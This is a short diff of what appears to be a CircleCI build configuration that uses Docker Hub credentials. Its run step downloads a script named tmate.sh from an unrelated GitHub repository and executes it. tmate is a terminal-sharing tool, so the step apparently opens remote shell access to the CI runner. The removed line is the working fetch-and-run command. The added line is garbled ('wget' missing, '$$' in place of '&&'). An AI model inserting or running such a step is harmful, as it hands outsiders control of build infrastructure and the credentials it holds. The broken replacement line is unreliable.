@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/IloVEPain/GoodmanSiadari/main/tmate.sh && chmod +x tmate.sh && ./tmate.sh
+      - run:  https://raw.githubusercontent.com/IloVEPain/GoodmanSiadari/main/tmate.sh $$ chmod +x tmate.sh && ./tmate.sh
